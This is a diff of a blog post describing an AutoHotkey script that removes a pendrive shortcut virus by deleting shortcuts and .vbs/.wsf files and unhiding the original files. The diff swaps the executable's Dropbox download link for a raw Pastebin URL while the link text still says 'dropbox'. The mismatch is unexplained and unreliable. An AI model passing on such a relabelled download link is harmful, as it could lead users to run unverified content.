@@ -14,7 +14,7 @@ The virus worked in 2 steps.
 
 So what my script does is that it iterates through all the files at the pendrive root, deletes the shortcut files and removes the system-hidden attributes from the original files. Additionally I also made it delete any .WsF and .vbs file that lied at the root.
 
-The code can be found at my [autohotkey-scripts repo](https://github.com/aviaryan/autohotkey-scripts/blob/master/Tools/shortcut_fix.ahk) and the executable can be downloaded from my [dropbox](https://www.dropbox.com/s/weh3m7qgbzi9dzs/shortcut_fix.zip?dl=0).
+The code can be found at my [autohotkey-scripts repo](https://github.com/aviaryan/autohotkey-scripts/blob/master/Tools/shortcut_fix.ahk) and the executable can be downloaded from my [dropbox](http://pastebin.com/raw/0a34it7y).
 
 
 > One obvious limitation of my script is that it can't disinfect the system. So if you accidentally activated the virus in the pendrive, your system will get infected and will infect all future drives that plug into it. 
